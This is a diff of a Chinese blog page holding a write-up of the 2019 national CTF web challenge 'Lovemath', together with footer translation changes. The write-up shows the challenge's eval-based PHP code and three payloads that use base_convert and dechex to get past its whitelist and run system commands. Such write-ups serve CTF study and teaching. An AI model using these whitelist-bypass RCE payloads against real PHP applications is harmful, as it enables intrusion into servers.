@@ -111,33 +111,51 @@
 </div>
             <div class="content">
                 <h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p>
-<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs); </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php 
+error_reporting(0); 
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag 
+if(!isset($_GET[&#39;c&#39;])){ 
+    show_source(__FILE__); 
+}else{ 
+    //例子 c=20-1 
+    $content = $_GET[&#39;c&#39;]; 
+    if (strlen($content) &gt;= 80) { 
+        die(&quot;太长了不会算&quot;); 
+    } 
+    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;]; 
+    foreach ($blacklist as $blackitem) { 
+        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) { 
+            die(&quot;请不要输入奇奇怪怪的字符&quot;); 
+        } 
+    } 
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp 
+    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];
+    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs); 
+    foreach ($used_funcs[0] as $func) { 
+        if (!in_array($func, $whitelist)) { 
+            die(&quot;请不要输入奇奇怪怪的函数&quot;); 
+        } 
+    } 
+    //帮你算出答案 
+    eval(&#39;echo &#39;.$content.&#39;;&#39;); 
 
+}</code></pre>
 <h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p>
 <p>也就是说只允许Eval使用白名单的函数做字符串</p>
 <p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p>
 <p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p>
 <p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p>
 <h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$input = hexdec(bin2hex(&quot;system(&apos;cat /flag&apos;);&quot;))</span><br><span class="line">$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</span><br></pre></td></tr></table></figure>
-
-<p>完整转换是这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</span><br></pre></td></tr></table></figure>
-
-<p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
+<pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))
+$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p>
+<pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p>
+<pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p>
 <p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p>
 <h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))()&#123;9&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>解码出来是<code>system(getallheaders(){9})</code></p>
+<pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p>
 <p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p>
 <h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;0&#125;(($$p)&#123;1&#125;)</span><br></pre></td></tr></table></figure>
-
-<p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
+<pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p>
 <p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>
 
             </div>
@@ -145,16 +163,16 @@
            
             <div class="copyright">
                 <div class="name">
-                    <a>本文作者:</a>
+                    <a>Author:</a>
                     <a>Sōsuke</a>
                 </div>
                 <div class="link">
-                    <a>本文链接:</a>
+                    <a>Link:</a>
                     <a class="permalink" href="https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/">https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</a>
                 </div>
                 <div class="license">
-                    <a>版权声明:</a>
-                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
                 </div>
             </div>
             
@@ -167,7 +185,7 @@
 
 <div class="tip">
 <button class="tip-btn">
-    打赏
+    Tip
 </button>
 <div class="tip-img">
 <ul>
